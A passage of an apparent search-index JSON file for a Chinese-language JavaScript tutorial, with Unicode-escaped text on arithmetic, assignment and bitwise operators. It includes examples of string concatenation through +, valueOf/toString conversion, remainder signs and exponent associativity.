\u8d4b\u503c\u8fd0\u7b97\u7b26\u8fd8\u53ef\u4ee5\u4e0e\u5176\u4ed6\u8fd0\u7b97\u7b26\u7ed3\u5408\uff0c\u5f62\u6210\u53d8\u4f53\u3002\u4e0b\u9762\u662f\u4e0e\u7b97\u672f\u8fd0\u7b97\u7b26\u7684\u7ed3\u5408\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u7b49\u540c\u4e8e x = x + y x += y // \u7b49\u540c\u4e8e x = x - y x -= y // \u7b49\u540c\u4e8e x = x * y x *= y // \u7b49\u540c\u4e8e x = x / y x /= y // \u7b49\u540c\u4e8e x = x % y x %= y // \u7b49\u540c\u4e8e x = x ** y x **= y \u4e0b\u9762\u662f\u4e0e\u4f4d\u8fd0\u7b97\u7b26\u7684\u7ed3\u5408\uff08\u5173\u4e8e\u4f4d\u8fd0\u7b97\u7b26\uff0c\u8bf7\u89c1\u540e\u6587\u7684\u4ecb\u7ecd\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u7b49\u540c\u4e8e x = x >> y x >>= y // \u7b49\u540c\u4e8e x = x << y x <<= y // \u7b49\u540c\u4e8e x = x >>> y x >>>= y // \u7b49\u540c\u4e8e x = x & y x &= y // \u7b49\u540c\u4e8e x = x | y x |= y // \u7b49\u540c\u4e8e x = x ^ y x ^= y \u8fd9\u4e9b\u590d\u5408\u7684\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u90fd\u662f\u5148\u8fdb\u884c\u6307\u5b9a\u8fd0\u7b97\uff0c\u7136\u540e\u5c06\u5f97\u5230\u503c\u8fd4\u56de\u7ed9\u5de6\u8fb9\u7684\u53d8\u91cf\u3002","title":"\u7b97\u672f\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_1","text":"\u8fd0\u7b97\u7b26\u662f\u5904\u7406\u6570\u636e\u7684\u57fa\u672c\u65b9\u6cd5\uff0c\u7528\u6765\u4ece\u73b0\u6709\u7684\u503c\u5f97\u5230\u65b0\u7684\u503c\u3002JavaScript \u63d0\u4f9b\u4e86\u591a\u79cd\u8fd0\u7b97\u7b26\uff0c\u8986\u76d6\u4e86\u6240\u6709\u4e3b\u8981\u7684\u8fd0\u7b97\u3002","title":"\u7b97\u672f\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_2","text":"JavaScript \u5171\u63d0\u4f9b10\u4e2a\u7b97\u672f\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u5b8c\u6210\u57fa\u672c\u7684\u7b97\u672f\u8fd0\u7b97\u3002 \u52a0\u6cd5\u8fd0\u7b97\u7b26 \uff1a x + y \u51cf\u6cd5\u8fd0\u7b97\u7b26 \uff1a x - y \u4e58\u6cd5\u8fd0\u7b97\u7b26 \uff1a x * y \u9664\u6cd5\u8fd0\u7b97\u7b26 \uff1a x / y \u6307\u6570\u8fd0\u7b97\u7b26 \uff1a x ** y \u4f59\u6570\u8fd0\u7b97\u7b26 \uff1a x % y \u81ea\u589e\u8fd0\u7b97\u7b26 \uff1a ++x \u6216\u8005 x++ \u81ea\u51cf\u8fd0\u7b97\u7b26 \uff1a --x \u6216\u8005 x-- \u6570\u503c\u8fd0\u7b97\u7b26 \uff1a +x \u8d1f\u6570\u503c\u8fd0\u7b97\u7b26 \uff1a -x \u51cf\u6cd5\u3001\u4e58\u6cd5\u3001\u9664\u6cd5\u8fd0\u7b97\u6cd5\u6bd4\u8f83\u5355\u7eaf\uff0c\u5c31\u662f\u6267\u884c\u76f8\u5e94\u7684\u6570\u5b66\u8fd0\u7b97\u3002\u4e0b\u9762\u4ecb\u7ecd\u5176\u4ed6\u51e0\u4e2a\u7b97\u672f\u8fd0\u7b97\u7b26\uff0c\u91cd\u70b9\u662f\u52a0\u6cd5\u8fd0\u7b97\u7b26\u3002","title":"\u6982\u8ff0"},{"location":"operators/arithmetic/#_3","text":"","title":"\u52a0\u6cd5\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_4","text":"\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\u662f\u6700\u5e38\u89c1\u7684\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u6c42\u4e24\u4e2a\u6570\u503c\u7684\u548c\u3002 1 1 + 1 // 2 JavaScript \u5141\u8bb8\u975e\u6570\u503c\u7684\u76f8\u52a0\u3002 1 2 true + true // 2 1 + true // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u662f\u4e24\u4e2a\u5e03\u5c14\u503c\u76f8\u52a0\uff0c\u7b2c\u4e8c\u884c\u662f\u6570\u503c\u4e0e\u5e03\u5c14\u503c\u76f8\u52a0\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\uff0c\u5e03\u5c14\u503c\u90fd\u4f1a\u81ea\u52a8\u8f6c\u6210\u6570\u503c\uff0c\u7136\u540e\u518d\u76f8\u52a0\u3002 \u6bd4\u8f83\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u52a0\uff0c\u8fd9\u65f6\u52a0\u6cd5\u8fd0\u7b97\u7b26\u4f1a\u53d8\u6210\u8fde\u63a5\u8fd0\u7b97\u7b26\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u5c06\u4e24\u4e2a\u539f\u5b57\u7b26\u4e32\u8fde\u63a5\u5728\u4e00\u8d77\u3002 1 'a' + 'bc' // \"abc\" \u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5b57\u7b26\u4e32\uff0c\u53e6\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u975e\u5b57\u7b26\u4e32\uff0c\u8fd9\u65f6\u975e\u5b57\u7b26\u4e32\u4f1a\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u8fde\u63a5\u5728\u4e00\u8d77\u3002 1 2 1 + 'a' // \"1a\" false + 'a' // \"falsea\" \u52a0\u6cd5\u8fd0\u7b97\u7b26\u662f\u5728\u8fd0\u884c\u65f6\u51b3\u5b9a\uff0c\u5230\u5e95\u662f\u6267\u884c\u76f8\u52a0\uff0c\u8fd8\u662f\u6267\u884c\u8fde\u63a5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd0\u7b97\u5b50\u7684\u4e0d\u540c\uff0c\u5bfc\u81f4\u4e86\u4e0d\u540c\u7684\u8bed\u6cd5\u884c\u4e3a\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u201c\u91cd\u8f7d\u201d\uff08overload\uff09\u3002\u7531\u4e8e\u52a0\u6cd5\u8fd0\u7b97\u7b26\u5b58\u5728\u91cd\u8f7d\uff0c\u53ef\u80fd\u6267\u884c\u4e24\u79cd\u8fd0\u7b97\uff0c\u4f7f\u7528\u7684\u65f6\u5019\u5fc5\u987b\u5f88\u5c0f\u5fc3\u3002 1 2 '3' + 4 + 5 // \"345\" 3 + 4 + '5' // \"75\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u4ece\u5de6\u5230\u53f3\u7684\u8fd0\u7b97\u6b21\u5e8f\uff0c\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u4e0d\u540c\u4f1a\u5bfc\u81f4\u4e0d\u540c\u7684\u7ed3\u679c\u3002 \u9664\u4e86\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff0c\u5176\u4ed6\u7b97\u672f\u8fd0\u7b97\u7b26\uff08\u6bd4\u5982\u51cf\u6cd5\u3001\u9664\u6cd5\u548c\u4e58\u6cd5\uff09\u90fd\u4e0d\u4f1a\u53d1\u751f\u91cd\u8f7d\u3002\u5b83\u4eec\u7684\u89c4\u5219\u662f\uff1a\u6240\u6709\u8fd0\u7b97\u5b50\u4e00\u5f8b\u8f6c\u4e3a\u6570\u503c\uff0c\u518d\u8fdb\u884c\u76f8\u5e94\u7684\u6570\u5b66\u8fd0\u7b97\u3002 1 2 3 1 - '2' // -1 1 * '2' // 2 1 / '2' // 0.5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51cf\u6cd5\u3001\u9664\u6cd5\u548c\u4e58\u6cd5\u8fd0\u7b97\u7b26\uff0c\u90fd\u662f\u5c06\u5b57\u7b26\u4e32\u81ea\u52a8\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fd0\u7b97\u3002","title":"\u57fa\u672c\u89c4\u5219"},{"location":"operators/arithmetic/#_5","text":"\u5982\u679c\u8fd0\u7b97\u5b50\u662f\u5bf9\u8c61\uff0c\u5fc5\u987b\u5148\u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7136\u540e\u518d\u76f8\u52a0\u3002 1 2 var obj = { p : 1 }; obj + 2 // \"[object Object]2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\u662f [object Object] \uff0c\u518d\u52a0 2 \u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u7ed3\u679c\u3002 \u5bf9\u8c61\u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u89c4\u5219\u5982\u4e0b\u3002 \u9996\u5148\uff0c\u81ea\u52a8\u8c03\u7528\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u3002 1 2 var obj = { p : 1 }; obj . valueOf () // { p: 1 } \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u603b\u662f\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\uff0c\u8fd9\u65f6\u518d\u81ea\u52a8\u8c03\u7528\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u5c06\u5176\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 var obj = { p : 1 }; obj . valueOf (). toString () // \"[object Object]\" \u5bf9\u8c61\u7684 toString \u65b9\u6cd5\u9ed8\u8ba4\u8fd4\u56de [object Object] \uff0c\u6240\u4ee5\u5c31\u5f97\u5230\u4e86\u6700\u524d\u9762\u90a3\u4e2a\u4f8b\u5b50\u7684\u7ed3\u679c\u3002 \u77e5\u9053\u4e86\u8fd9\u4e2a\u89c4\u5219\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49 valueOf \u65b9\u6cd5\u6216 toString \u65b9\u6cd5\uff0c\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 var obj = { valueOf : function () { return 1 ; } }; obj + 2 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49 obj \u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de 1 \uff0c\u4e8e\u662f obj + 2 \u5c31\u5f97\u5230\u4e86 3 \u3002\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8e valueOf \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u6240\u4ee5\u4e0d\u518d\u8c03\u7528 toString \u65b9\u6cd5\u3002 \u4e0b\u9762\u662f\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var obj = { toString : function () { return 'hello' ; } }; obj + 2 // \"hello2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 toString \u65b9\u6cd5\u8fd4\u56de\u5b57\u7b26\u4e32 hello \u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5b57\u7b26\u4e32\uff0c\u52a0\u6cd5\u8fd0\u7b97\u7b26\u5c31\u53d8\u6210\u8fde\u63a5\u8fd0\u7b97\u7b26\uff0c\u8fd4\u56de\u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u6709\u4e00\u4e2a\u7279\u4f8b\uff0c\u5982\u679c\u8fd0\u7b97\u5b50\u662f\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u90a3\u4e48\u4f1a\u4f18\u5148\u6267\u884c toString \u65b9\u6cd5\u3002 1 2 3 4 5 var obj = new Date (); obj . valueOf = function () { return 1 }; obj . toString = function () { return 'hello' }; obj + 2 // \"hello2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u662f\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u5e76\u4e14\u81ea\u5b9a\u4e49\u4e86 valueOf \u65b9\u6cd5\u548c toString \u65b9\u6cd5\uff0c\u7ed3\u679c toString \u65b9\u6cd5\u4f18\u5148\u6267\u884c\u3002","title":"\u5bf9\u8c61\u7684\u76f8\u52a0"},{"location":"operators/arithmetic/#_6","text":"\u4f59\u6570\u8fd0\u7b97\u7b26\uff08 % \uff09\u8fd4\u56de\u524d\u4e00\u4e2a\u8fd0\u7b97\u5b50\u88ab\u540e\u4e00\u4e2a\u8fd0\u7b97\u5b50\u9664\uff0c\u6240\u5f97\u7684\u4f59\u6570\u3002 1 12 % 5 // 2 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u6b63\u8d1f\u53f7\u7531\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u6b63\u8d1f\u53f7\u51b3\u5b9a\u3002 1 2 - 1 % 2 // -1 1 % - 2 // 1 \u6240\u4ee5\uff0c\u4e3a\u4e86\u5f97\u5230\u8d1f\u6570\u7684\u6b63\u786e\u4f59\u6570\u503c\uff0c\u53ef\u4ee5\u5148\u4f7f\u7528\u7edd\u5bf9\u503c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u9519\u8bef\u7684\u5199\u6cd5 function isOdd ( n ) { return n % 2 === 1 ; } isOdd ( - 5 ) // false isOdd ( - 4 ) // false // \u6b63\u786e\u7684\u5199\u6cd5 function isOdd ( n ) { return Math . abs ( n % 2 ) === 1 ; } isOdd ( - 5 ) // true isOdd ( - 4 ) // false \u4f59\u6570\u8fd0\u7b97\u7b26\u8fd8\u53ef\u4ee5\u7528\u4e8e\u6d6e\u70b9\u6570\u7684\u8fd0\u7b97\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u7684\u503c\uff0c\u65e0\u6cd5\u5f97\u5230\u5b8c\u5168\u51c6\u786e\u7684\u7ed3\u679c\u3002 1 2 6.5 % 2.1 // 0.19999999999999973","title":"\u4f59\u6570\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_7","text":"\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\uff0c\u662f\u4e00\u5143\u8fd0\u7b97\u7b26\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u8fd0\u7b97\u5b50\u3002\u5b83\u4eec\u7684\u4f5c\u7528\u662f\u5c06\u8fd0\u7b97\u5b50\u9996\u5148\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u52a0\u4e0a1\u6216\u8005\u51cf\u53bb1\u3002\u5b83\u4eec\u4f1a\u4fee\u6539\u539f\u59cb\u53d8\u91cf\u3002 1 2 3 4 5 6 var x = 1 ; ++ x // 2 x // 2 -- x // 1 x // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u53d8\u91cf x \u81ea\u589e\u540e\uff0c\u8fd4\u56de 2 \uff0c\u518d\u8fdb\u884c\u81ea\u51cf\uff0c\u8fd4\u56de 1 \u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u90fd\u4f1a\u4f7f\u5f97\uff0c\u539f\u59cb\u53d8\u91cf x \u7684\u503c\u53d1\u751f\u6539\u53d8\u3002 \u8fd0\u7b97\u4e4b\u540e\uff0c\u53d8\u91cf\u7684\u503c\u53d1\u751f\u53d8\u5316\uff0c\u8fd9\u79cd\u6548\u5e94\u53eb\u505a\u8fd0\u7b97\u7684\u526f\u4f5c\u7528\uff08side effect\uff09\u3002\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u662f\u4ec5\u6709\u7684\u4e24\u4e2a\u5177\u6709\u526f\u4f5c\u7528\u7684\u8fd0\u7b97\u7b26\uff0c\u5176\u4ed6\u8fd0\u7b97\u7b26\u90fd\u4e0d\u4f1a\u6539\u53d8\u53d8\u91cf\u7684\u503c\u3002 \u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff0c\u5c31\u662f\u653e\u5728\u53d8\u91cf\u4e4b\u540e\uff0c\u4f1a\u5148\u8fd4\u56de\u53d8\u91cf\u64cd\u4f5c\u524d\u7684\u503c\uff0c\u518d\u8fdb\u884c\u81ea\u589e/\u81ea\u51cf\u64cd\u4f5c\uff1b\u653e\u5728\u53d8\u91cf\u4e4b\u524d\uff0c\u4f1a\u5148\u8fdb\u884c\u81ea\u589e/\u81ea\u51cf\u64cd\u4f5c\uff0c\u518d\u8fd4\u56de\u53d8\u91cf\u64cd\u4f5c\u540e\u7684\u503c\u3002 1 2 3 4 5 var x = 1 ; var y = 1 ; x ++ // 1 ++ y // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u662f\u5148\u8fd4\u56de\u5f53\u524d\u503c\uff0c\u7136\u540e\u81ea\u589e\uff0c\u6240\u4ee5\u5f97\u5230 1 \uff1b y \u662f\u5148\u81ea\u589e\uff0c\u7136\u540e\u8fd4\u56de\u65b0\u7684\u503c\uff0c\u6240\u4ee5\u5f97\u5230 2 \u3002","title":"\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_8","text":"\u6570\u503c\u8fd0\u7b97\u7b26\uff08 + \uff09\u540c\u6837\u4f7f\u7528\u52a0\u53f7\uff0c\u4f46\u5b83\u662f\u4e00\u5143\u8fd0\u7b97\u7b26\uff08\u53ea\u9700\u8981\u4e00\u4e2a\u64cd\u4f5c\u6570\uff09\uff0c\u800c\u52a0\u6cd5\u8fd0\u7b97\u7b26\u662f\u4e8c\u5143\u8fd0\u7b97\u7b26\uff08\u9700\u8981\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09\u3002 \u6570\u503c\u8fd0\u7b97\u7b26\u7684\u4f5c\u7528\u5728\u4e8e\u53ef\u4ee5\u5c06\u4efb\u4f55\u503c\u8f6c\u4e3a\u6570\u503c\uff08\u4e0e Number \u51fd\u6570\u7684\u4f5c\u7528\u76f8\u540c\uff09\u3002 1 2 3 + true // 1 + [] // 0 + {} // NaN \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u975e\u6570\u503c\u7ecf\u8fc7\u6570\u503c\u8fd0\u7b97\u7b26\u4ee5\u540e\uff0c\u90fd\u53d8\u6210\u4e86\u6570\u503c\uff08\u6700\u540e\u4e00\u884c NaN \u4e5f\u662f\u6570\u503c\uff09\u3002\u5177\u4f53\u7684\u7c7b\u578b\u8f6c\u6362\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff08 - \uff09\uff0c\u4e5f\u540c\u6837\u5177\u6709\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a\u6570\u503c\u7684\u529f\u80fd\uff0c\u53ea\u4e0d\u8fc7\u5f97\u5230\u7684\u503c\u6b63\u8d1f\u76f8\u53cd\u3002\u8fde\u7528\u4e24\u4e2a\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u7b49\u540c\u4e8e\u6570\u503c\u8fd0\u7b97\u7b26\u3002 1 2 3 var x = 1 ; - x // -1 - ( - x ) // 1 \u4e0a\u9762\u4ee3\u7801\u6700\u540e\u4e00\u884c\u7684\u5706\u62ec\u53f7\u4e0d\u53ef\u5c11\uff0c\u5426\u5219\u4f1a\u53d8\u6210\u81ea\u51cf\u8fd0\u7b97\u7b26\u3002 \u6570\u503c\u8fd0\u7b97\u7b26\u53f7\u548c\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u503c\uff0c\u800c\u4e0d\u4f1a\u6539\u53d8\u539f\u59cb\u53d8\u91cf\u7684\u503c\u3002","title":"\u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_9","text":"\u6307\u6570\u8fd0\u7b97\u7b26\uff08 ** \uff09\u5b8c\u6210\u6307\u6570\u8fd0\u7b97\uff0c\u524d\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5e95\u6570\uff0c\u540e\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u6307\u6570\u3002 1 2 ** 4 // 16 \u6ce8\u610f\uff0c\u6307\u6570\u8fd0\u7b97\u7b26\u662f\u53f3\u7ed3\u5408\uff0c\u800c\u4e0d\u662f\u5de6\u7ed3\u5408\u3002\u5373\u591a\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\u8fde\u7528\u65f6\uff0c\u5148\u8fdb\u884c\u6700\u53f3\u8fb9\u7684\u8ba1\u7b97\u3002 1 2 3 // \u76f8\u5f53\u4e8e 2 ** (3 ** 2) 2 ** 3 ** 2 // 512 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6307\u6570\u8fd0\u7b97\u7b26\u662f\u53f3\u7ed3\u5408\uff0c\u6240\u4ee5\u5148\u8ba1\u7b97\u7b2c\u4e8c\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u662f\u7b2c\u4e00\u4e2a\u3002","title":"\u6307\u6570\u8fd0\u7b97\u7b26"},{"location":"operators/arithmetic/#_10","text":"\u8d4b\u503c\u8fd0\u7b97\u7b26\uff08Assignment Operators\uff09\u7528\u4e8e\u7ed9\u53d8\u91cf\u8d4b\u503c\u3002 \u6700\u5e38\u89c1\u7684\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u5f53\u7136\u5c31\u662f\u7b49\u53f7\uff08 = \uff09\u3002 1 2 3 4 5 // \u5c06 1 \u8d4b\u503c\u7ed9\u53d8\u91cf x var x = 1 ; // \u5c06\u53d8\u91cf y \u7684\u503c\u8d4b\u503c\u7ed9\u53d8\u91cf x var x = y ; \u8d4b\u503c\u8fd0\u7b97\u7b26\u8fd8\u53ef\u4ee5\u4e0e\u5176\u4ed6\u8fd0\u7b97\u7b26\u7ed3\u5408\uff0c\u5f62\u6210\u53d8\u4f53\u3002\u4e0b\u9762\u662f\u4e0e\u7b97\u672f\u8fd0\u7b97\u7b26\u7684\u7ed3\u5408\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u7b49\u540c\u4e8e x = x + y x += y // \u7b49\u540c\u4e8e x = x - y x -= y // \u7b49\u540c\u4e8e x = x * y x *= y // \u7b49\u540c\u4e8e x = x / y x /= y // \u7b49\u540c\u4e8e x = x % y x %= y // \u7b49\u540c\u4e8e x = x ** y x **= y \u4e0b\u9762\u662f\u4e0e\u4f4d\u8fd0\u7b97\u7b26\u7684\u7ed3\u5408\uff08\u5173\u4e8e\u4f4d\u8fd0\u7b97\u7b26\uff0c\u8bf7\u89c1\u540e\u6587\u7684\u4ecb\u7ecd\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u7b49\u540c\u4e8e x = x >> y x >>= y // \u7b49\u540c\u4e8e x = x << y x <<= y // \u7b49\u540c\u4e8e x = x >>> y x >>>= y // \u7b49\u540c\u4e8e x = x & y x &= y // \u7b49\u540c\u4e8e x = x | y x |= y // \u7b49\u540c\u4e8e x = x ^ y x ^= y \u8fd9\u4e9b\u590d\u5408\u7684\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u90fd\u662f\u5148\u8fdb\u884c\u6307\u5b9a\u8fd0\u7b97\uff0c\u7136\u540e\u5c06\u5f97\u5230\u503c\u8fd4\u56de\u7ed9\u5de6\u8fb9\u7684\u53d8\u91cf\u3002","title":"\u8d4b\u503c\u8fd0\u7b97\u7b26"},{"location":"operators/bit/","text":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26 \u00b6 \u6982\u8ff0 \u00b6 \u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26\u7528\u4e8e\u76f4\u63a5\u5bf9\u4e8c\u8fdb\u5236\u4f4d\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e00\u5171\u67097\u4e2a\u3002 \u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26 \uff08or\uff09\uff1a\u7b26\u53f7\u4e3a | \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e3a 0 \uff0c\u5219\u7ed3\u679c\u4e3a 0 \uff0c\u5426\u5219\u4e3a 1 \u3002 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26 \uff08and\uff09\uff1a\u7b26\u53f7\u4e3a & \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e3a1\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\u3002 \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26 \uff08not\uff09\uff1a\u7b26\u53f7\u4e3a ~ \uff0c\u8868\u793a\u5bf9\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53d6\u53cd\u3002 \u5f02\u6216\u8fd0\u7b97\u7b26 \uff08xor\uff09\uff1a\u7b26\u53f7\u4e3a ^ \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u76f8\u540c\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\u3002 \u5de6\u79fb\u8fd0\u7b97\u7b26 \uff08left shift\uff09\uff1a\u7b26\u53f7\u4e3a << \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u53f3\u79fb\u8fd0\u7b97\u7b26 \uff08right shift\uff09\uff1a\u7b26\u53f7\u4e3a >> \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26 \uff08zero filled right shift\uff09\uff1a\u7b26\u53f7\u4e3a >>> \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u8fd9\u4e9b\u4f4d\u8fd0\u7b97\u7b26\u76f4\u63a5\u5904\u7406\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\uff08bit\uff09\uff0c\u6240\u4ee5\u662f\u975e\u5e38\u5e95\u5c42\u7684\u8fd0\u7b97\uff0c\u597d\u5904\u662f\u901f\u5ea6\u6781\u5feb\uff0c\u7f3a\u70b9\u662f\u5f88\u4e0d\u76f4\u89c2\uff0c\u8bb8\u591a\u573a\u5408\u4e0d\u80fd\u4f7f\u7528\u5b83\u4eec\uff0c\u5426\u5219\u4f1a\u4f7f\u4ee3\u7801\u96be\u4ee5\u7406\u89e3\u548c\u67e5\u9519\u3002 \u6709\u4e00\u70b9\u9700\u8981\u7279\u522b\u6ce8\u610f\uff0c\u4f4d\u8fd0\u7b97\u7b26\u53ea\u5bf9\u6574\u6570\u8d77\u4f5c\u7528\uff0c\u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u4e0d\u662f\u6574\u6570\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u6574\u6570\u540e\u518d\u6267\u884c\u3002\u53e6\u5916\uff0c\u867d\u7136\u5728 JavaScript \u5185\u90e8\uff0c\u6570\u503c\u90fd\u662f\u4ee564\u4f4d\u6d6e\u70b9\u6570\u7684\u5f62\u5f0f\u50a8\u5b58\uff0c\u4f46\u662f\u505a\u4f4d\u8fd0\u7b97\u7684\u65f6\u5019\uff0c\u662f\u4ee532\u4f4d\u5e26\u7b26\u53f7\u7684\u6574\u6570\u8fdb\u884c\u8fd0\u7b97\u7684\uff0c\u5e76\u4e14\u8fd4\u56de\u503c\u4e5f\u662f\u4e00\u4e2a32\u4f4d\u5e26\u7b26\u53f7\u7684\u6574\u6570\u3002 1 i = i | 0 ; \u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\uff0c\u5c31\u662f\u5c06 i \uff08\u4e0d\u7ba1\u662f\u6574\u6570\u6216\u5c0f\u6570\uff09\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002 \u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u53ef\u4ee5\u5199\u51fa\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u4efb\u610f\u6570\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002 1 2 3 function toInt32 ( x ) { return x | 0 ; } \u4e0a\u9762\u8fd9\u4e2a\u51fd\u6570\u5c06\u4efb\u610f\u503c\u4e0e 0 